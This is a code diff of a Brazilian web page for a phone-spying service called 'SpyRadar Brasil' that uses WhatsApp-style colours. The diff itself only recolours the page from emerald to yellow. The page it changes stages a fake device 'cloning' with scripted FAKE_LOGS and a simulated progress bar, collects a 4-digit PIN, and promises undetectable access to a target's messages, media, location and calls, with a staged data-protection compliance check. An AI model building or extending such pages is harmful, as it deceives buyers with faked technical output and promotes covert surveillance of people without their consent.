@@ -55,7 +55,7 @@ const FAKE_LOGS: string[] = [
 
 function Telemetry({ label, value, unit }: { label: string; value: string; unit: string }) {
   return (
-    <div className="bg-white/70 border border-emerald-100 rounded-xl px-3 py-2">
+    <div className="bg-white/70 border border-yellow-100 rounded-xl px-3 py-2">
       <div className="text-[9px] uppercase tracking-[0.2em] text-slate-500 font-['Geist_Mono',monospace]">{label}</div>
       <div className="text-[#25D366] font-bold font-['Geist_Mono',monospace] text-sm leading-tight">{value}</div>
       <div className="text-[9px] text-slate-500 font-['Geist_Mono',monospace]">{unit}</div>
@@ -152,15 +152,15 @@ function CadastroDispositivoPage() {
         className="absolute inset-0 pointer-events-none"
         style={{
           backgroundImage:
-            "linear-gradient(to right, rgba(16,185,129,0.06) 1px, transparent 1px), linear-gradient(to bottom, rgba(16,185,129,0.06) 1px, transparent 1px)",
+            "linear-gradient(to right, rgba(217,169,40,0.06) 1px, transparent 1px), linear-gradient(to bottom, rgba(217,169,40,0.06) 1px, transparent 1px)",
           backgroundSize: "32px 32px",
         }}
       />
-      <div className="absolute -top-32 left-1/2 -translate-x-1/2 w-[700px] h-[700px] bg-emerald-500/[0.10] blur-[160px] rounded-full pointer-events-none" />
+      <div className="absolute -top-32 left-1/2 -translate-x-1/2 w-[700px] h-[700px] bg-yellow-500/[0.10] blur-[160px] rounded-full pointer-events-none" />
 
       <div className="relative z-10 max-w-5xl mx-auto px-4 py-6 space-y-5">
         <div className="flex items-center gap-2">
-          <div className="w-9 h-9 bg-slate-100 border border-emerald-300 rounded-xl flex items-center justify-center">
+          <div className="w-9 h-9 bg-slate-100 border border-yellow-300 rounded-xl flex items-center justify-center">
             <span className="text-[#128C7E] text-lg">📡</span>
           </div>
           <div className="flex-1">
@@ -170,8 +170,8 @@ function CadastroDispositivoPage() {
             <div className="text-sm font-bold">Cadastro de Dispositivo · Espelhamento</div>
           </div>
           {phase === "installing" && (
-            <div className="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-50 border border-emerald-300">
-              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+            <div className="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full bg-yellow-50 border border-yellow-300">
+              <span className="w-2 h-2 rounded-full bg-yellow-400 animate-pulse" />
               <span className="text-[11px] font-['Geist_Mono',monospace] text-[#25D366]">CLONAGEM EM ANDAMENTO</span>
             </div>
           )}
@@ -180,7 +180,7 @@ function CadastroDispositivoPage() {
         {/* INSTALLING */}
         {phase === "installing" && (
           <div className="grid lg:grid-cols-5 gap-4">
-            <div className="lg:col-span-3 bg-gradient-to-br from-white/95 to-slate-50/40 backdrop-blur-xl border border-emerald-300 rounded-3xl p-5 space-y-4 shadow-[0_25px_70px_rgba(16,185,129,0.18)]">
+            <div className="lg:col-span-3 bg-gradient-to-br from-white/95 to-slate-50/40 backdrop-blur-xl border border-yellow-300 rounded-3xl p-5 space-y-4 shadow-[0_25px_70px_rgba(217,169,40,0.18)]">
               <div className="text-center space-y-1">
                 <div className="text-[10px] uppercase tracking-[0.2em] text-[#128C7E]/80 font-['Geist_Mono',monospace]">
                   Clonando dispositivo {doAlvo}
@@ -191,7 +191,7 @@ function CadastroDispositivoPage() {
 
               <div className="h-2 bg-slate-100 rounded-full overflow-hidden">
                 <div
-                  className="h-full bg-gradient-to-r from-emerald-400 to-emerald-600 transition-all duration-200"
+                  className="h-full bg-gradient-to-r from-yellow-400 to-yellow-600 transition-all duration-200"
                   style={{ width: `${progress}%` }}
                 />
               </div>
@@ -205,9 +205,9 @@ function CadastroDispositivoPage() {
                       <span
                         className={`shrink-0 w-6 h-6 rounded-full flex items-center justify-center text-[11px] font-bold border ${
                           done
-                            ? "bg-emerald-100 border-emerald-500/60 text-[#25D366]"
+                            ? "bg-yellow-100 border-yellow-500/60 text-[#25D366]"
                             : active
-                              ? "bg-emerald-50 border-emerald-300 text-[#25D366] animate-pulse"
+                              ? "bg-yellow-50 border-yellow-300 text-[#25D366] animate-pulse"
                               : "bg-slate-100 border-slate-300 text-slate-500"
                         }`}
                       >
@@ -232,11 +232,11 @@ function CadastroDispositivoPage() {
             </div>
 
             {/* LOG PANEL */}
-            <div className="lg:col-span-2 bg-white border border-emerald-200 rounded-3xl overflow-hidden shadow-[0_25px_70px_rgba(16,185,129,0.12)] flex flex-col min-h-[420px]">
-              <div className="flex items-center gap-2 px-4 py-2 border-b border-emerald-100 bg-white">
+            <div className="lg:col-span-2 bg-white border border-yellow-200 rounded-3xl overflow-hidden shadow-[0_25px_70px_rgba(217,169,40,0.12)] flex flex-col min-h-[420px]">
+              <div className="flex items-center gap-2 px-4 py-2 border-b border-yellow-100 bg-white">
                 <span className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
                 <span className="w-2.5 h-2.5 rounded-full bg-amber-400/80" />
-                <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
+                <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" />
                 <span className="ml-2 text-[10px] uppercase tracking-[0.2em] text-[#128C7E]/80 font-['Geist_Mono',monospace]">
                   zr-mirror-agent · live
                 </span>
@@ -249,11 +249,11 @@ function CadastroDispositivoPage() {
                   >
                     <span className="text-slate-500">$ </span>
                     {line}
-                    {idx === arr.length - 1 && <span className="inline-block w-2 h-3 bg-emerald-400 ml-1 animate-pulse align-middle" />}
+                    {idx === arr.length - 1 && <span className="inline-block w-2 h-3 bg-yellow-400 ml-1 animate-pulse align-middle" />}
                   </div>
                 ))}
               </div>
-              <div className="px-4 py-2 border-t border-emerald-100 bg-white flex items-center justify-between text-[10px] font-['Geist_Mono',monospace]">
+              <div className="px-4 py-2 border-t border-yellow-100 bg-white flex items-center justify-between text-[10px] font-['Geist_Mono',monospace]">
                 <span className="text-slate-500">node: <span className="text-[#25D366]">mirror-br-03</span></span>
                 <span className="text-slate-500">pid: <span className="text-[#25D366]">{4727 + Math.floor(progress * 13)}</span></span>
               </div>
@@ -265,7 +265,7 @@ function CadastroDispositivoPage() {
 
         {/* PASSWORD */}
         {phase === "password" && (
-          <div className="bg-gradient-to-br from-white/95 to-slate-50/40 backdrop-blur-xl border border-emerald-300 rounded-3xl p-5 space-y-4 shadow-[0_25px_70px_rgba(16,185,129,0.18)]">
+          <div className="bg-gradient-to-br from-white/95 to-slate-50/40 backdrop-blur-xl border border-yellow-300 rounded-3xl p-5 space-y-4 shadow-[0_25px_70px_rgba(217,169,40,0.18)]">
             <div className="text-center space-y-1">
               <div className="text-[10px] uppercase tracking-[0.2em] text-[#25D366] font-['Geist_Mono',monospace]">
                 ✅ Dispositivo cadastrado
@@ -292,7 +292,7 @@ function CadastroDispositivoPage() {
                       prev?.focus();
                     }
                   }}
-                  className="w-14 h-16 text-center text-2xl font-extrabold bg-white border-2 border-emerald-300 rounded-2xl focus:outline-none focus:border-emerald-400 text-[#25D366]"
+                  className="w-14 h-16 text-center text-2xl font-extrabold bg-white border-2 border-yellow-300 rounded-2xl focus:outline-none focus:border-yellow-400 text-[#25D366]"
                 />
               ))}
             </div>
@@ -301,7 +301,7 @@ function CadastroDispositivoPage() {
 
             <button
               onClick={submitPin}
-              className="w-full h-14 bg-gradient-to-r from-[#25D366] to-[#128C7E] hover:from-[#1eb959] hover:to-[#0f7266] text-white font-extrabold rounded-2xl transition-all active:scale-[0.98] uppercase tracking-wider text-[15px] shadow-[0_10px_30px_-8px_rgba(16,185,129,0.6)]"
+              className="w-full h-14 bg-gradient-to-r from-[#25D366] to-[#128C7E] hover:from-[#1eb959] hover:to-[#0f7266] text-white font-extrabold rounded-2xl transition-all active:scale-[0.98] uppercase tracking-wider text-[15px] shadow-[0_10px_30px_-8px_rgba(217,169,40,0.6)]"
             >
               Cadastrar senha e continuar
             </button>
@@ -315,7 +315,7 @@ function CadastroDispositivoPage() {
         {/* INSTRUCTIONS */}
         {(phase === "instructions" || phase === "checking-lgpd") && (
           <>
-            <div className="bg-gradient-to-br from-white/95 to-slate-50/40 backdrop-blur-xl border border-emerald-300 rounded-3xl p-5 space-y-4 shadow-[0_25px_70px_rgba(16,185,129,0.18)]">
+            <div className="bg-gradient-to-br from-white/95 to-slate-50/40 backdrop-blur-xl border border-yellow-300 rounded-3xl p-5 space-y-4 shadow-[0_25px_70px_rgba(217,169,40,0.18)]">
               <div className="text-center space-y-1">
                 <div className="text-[10px] uppercase tracking-[0.2em] text-[#25D366] font-['Geist_Mono',monospace]">
                   🎉 Espelhamento ativado
@@ -326,7 +326,7 @@ function CadastroDispositivoPage() {
                 </p>
               </div>
 
-              <div className="bg-white border-2 border-emerald-500/50 rounded-2xl p-4 text-center">
+              <div className="bg-white border-2 border-yellow-500/50 rounded-2xl p-4 text-center">
                 <div className="text-[10px] uppercase tracking-[0.2em] text-[#128C7E]/80 font-['Geist_Mono',monospace] mb-1">
                   Acesse esse link no navegador
                 </div>
@@ -340,21 +340,21 @@ function CadastroDispositivoPage() {
 
               <ol className="space-y-3 pt-1">
                 <li className="flex gap-3">
-                  <span className="shrink-0 w-7 h-7 rounded-full bg-emerald-100 border border-emerald-300 text-[#25D366] font-bold flex items-center justify-center text-[12px]">1</span>
+                  <span className="shrink-0 w-7 h-7 rounded-full bg-yellow-100 border border-yellow-300 text-[#25D366] font-bold flex items-center justify-center text-[12px]">1</span>
                   <div>
                     <div className="font-semibold text-slate-900 text-[14px]">Abra o navegador do seu celular ou computador</div>
                     <div className="text-[12px] text-slate-500">Pode ser Chrome, Safari, Edge ou qualquer outro. Use uma aba anônima se quiser sigilo máximo — o SpyRadar Brasil não deixa rastros no histórico.</div>
                   </div>
                 </li>
                 <li className="flex gap-3">
-                  <span className="shrink-0 w-7 h-7 rounded-full bg-emerald-100 border border-emerald-300 text-[#25D366] font-bold flex items-center justify-center text-[12px]">2</span>
+                  <span className="shrink-0 w-7 h-7 rounded-full bg-yellow-100 border border-yellow-300 text-[#25D366] font-bold flex items-center justify-center text-[12px]">2</span>
                   <div>
                     <div className="font-semibold text-slate-900 text-[14px]">Digite o endereço <span className="text-[#25D366] font-['Geist_Mono',monospace]">whatsradar.com/acessar-celular</span></div>
                     <div className="text-[12px] text-slate-500">Digite manualmente na barra de endereço (não clique em links suspeitos). Salve nos favoritos para acessar rapidamente quando quiser.</div>
                   </div>
                 </li>
                 <li className="flex gap-3">
-                  <span className="shrink-0 w-7 h-7 rounded-full bg-emerald-100 border border-emerald-300 text-[#25D366] font-bold flex items-center justify-center text-[12px]">3</span>
+                  <span className="shrink-0 w-7 h-7 rounded-full bg-yellow-100 border border-yellow-300 text-[#25D366] font-bold flex items-center justify-center text-[12px]">3</span>
                   <div>
                     <div className="font-semibold text-slate-900 text-[14px]">Informe o número clonado com DDD</div>
                     <div className="text-[12px] text-slate-500 font-['Geist_Mono',monospace]">{maskedPhone}</div>
@@ -362,14 +362,14 @@ function CadastroDispositivoPage() {
                   </div>
                 </li>
                 <li className="flex gap-3">
-                  <span className="shrink-0 w-7 h-7 rounded-full bg-emerald-100 border border-emerald-300 text-[#25D366] font-bold flex items-center justify-center text-[12px]">4</span>
+                  <span className="shrink-0 w-7 h-7 rounded-full bg-yellow-100 border border-yellow-300 text-[#25D366] font-bold flex items-center justify-center text-[12px]">4</span>
                   <div>
                     <div className="font-semibold text-slate-900 text-[14px]">Digite sua senha de 4 dígitos</div>
                     <div className="text-[12px] text-slate-500">A mesma senha que você acabou de cadastrar nesta tela. Guarde com cuidado — ela é o único caminho para o painel clonado e não é recuperável sem reativação da licença.</div>
                   </div>
                 </li>
                 <li className="flex gap-3">
-                  <span className="shrink-0 w-7 h-7 rounded-full bg-emerald-100 border border-emerald-300 text-[#25D366] font-bold flex items-center justify-center text-[12px]">5</span>
+                  <span className="shrink-0 w-7 h-7 rounded-full bg-yellow-100 border border-yellow-300 text-[#25D366] font-bold flex items-center justify-center text-[12px]">5</span>
                   <div>
                     <div className="font-semibold text-slate-900 text-[14px]">Pronto — acesso total liberado em tempo real</div>
                     <div className="text-[12px] text-slate-500">WhatsApp (incluindo mensagens apagadas), áudios, fotos, vídeos, contatos, localização ao vivo, redes sociais e histórico de chamadas. Tudo espelhado de forma 100% indetectável {targetName ? `por ${targetName}` : "pelo alvo"}.</div>
@@ -383,8 +383,8 @@ function CadastroDispositivoPage() {
             </div>
 
             {phase === "checking-lgpd" && !showLgpd && (
-              <div className="flex items-center justify-center gap-2 text-[12px] text-slate-700 bg-emerald-50 border border-emerald-200 rounded-xl py-2">
-                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+              <div className="flex items-center justify-center gap-2 text-[12px] text-slate-700 bg-yellow-50 border border-yellow-200 rounded-xl py-2">
+                <span className="w-2 h-2 rounded-full bg-yellow-400 animate-pulse" />
                 <span className="font-semibold font-['Geist_Mono',monospace]">Validando conformidade LGPD…</span>
               </div>
             )}
@@ -420,7 +420,7 @@ function CadastroDispositivoPage() {
 
             <button
               onClick={acceptLgpd}
-              className="w-full h-14 bg-gradient-to-r from-[#25D366] to-[#128C7E] hover:from-[#1eb959] hover:to-[#0f7266] text-white font-extrabold rounded-2xl transition-all active:scale-[0.98] uppercase tracking-wider text-[14px] shadow-[0_10px_30px_-8px_rgba(16,185,129,0.6)]"
+              className="w-full h-14 bg-gradient-to-r from-[#25D366] to-[#128C7E] hover:from-[#1eb959] hover:to-[#0f7266] text-white font-extrabold rounded-2xl transition-all active:scale-[0.98] uppercase tracking-wider text-[14px] shadow-[0_10px_30px_-8px_rgba(217,169,40,0.6)]"
             >
               ✅ Sim, aceitar e continuar
             </button>
